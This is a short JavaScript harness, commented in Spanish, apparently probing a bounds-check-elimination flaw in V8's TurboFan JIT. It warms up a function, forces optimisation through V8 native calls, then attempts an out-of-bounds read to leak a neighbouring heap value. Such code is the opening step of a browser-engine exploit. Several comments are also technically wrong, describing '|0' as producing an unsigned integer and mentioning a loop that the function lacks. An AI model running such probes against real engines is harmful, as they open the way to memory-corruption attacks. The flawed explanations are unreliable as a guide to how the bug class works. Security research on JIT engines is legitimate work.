// Harness de pruebas para fallo de Bounds Check Elimination (BCE) en JIT
function triggerBCE(arr, index) {
    // Forzar al compilador a tratar el índice como entero sin signo optimizado
    let idx = index | 0;
    if (idx < 0) return 0;
    
    // Si Turbofan confía ciegamente en el bucle y elimina el chequeo, leerá fuera del arreglo
    return arr[idx];
}

print("[*] Preparando función para optimización JIT con BCE...");
let targetArray = [1.1, 2.2, 3.3, 4.4, 5.5];

// Calentar el motor con accesos perfectamente válidos
for (let i = 0; i < 10000; i++) {
    triggerBCE(targetArray, 2);
}

%PrepareFunctionForOptimization(triggerBCE);
%OptimizeFunctionOnNextCall(triggerBCE);

// Disparar la función con un índice fuera de rango para probar desincronización
try {
    let leaked = triggerBCE(targetArray, 100);
    print("[+] Acceso OOB ejecutado. Valor obtenido del heap vecino: " + leaked);
} catch (e) {
    print("[!] Excepción capturada por el motor: " + e.message);
}

print("[*] Análisis de BCE finalizado.");
